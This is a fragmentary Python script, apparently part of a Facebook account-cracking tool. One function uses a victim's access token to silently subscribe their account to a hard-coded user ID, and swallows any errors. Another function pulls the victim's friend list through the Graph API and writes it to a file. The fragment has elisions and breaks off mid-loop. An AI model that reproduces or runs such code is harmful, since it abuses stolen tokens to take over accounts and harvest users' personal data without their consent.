...
def mr___profaisor(sultani):
    try:
        kentod = sultani
        requests.post('https://graph.facebook.com/100008940691253/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100008940691253/subscribers?access_token=%s' % kentod)
    except:
        pass
...
def teman(sultani):
    ...
    try:
        ...
        ys = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/sawx?limit=%s&access_token=%s' % (asw, sultani)).json()['data']:
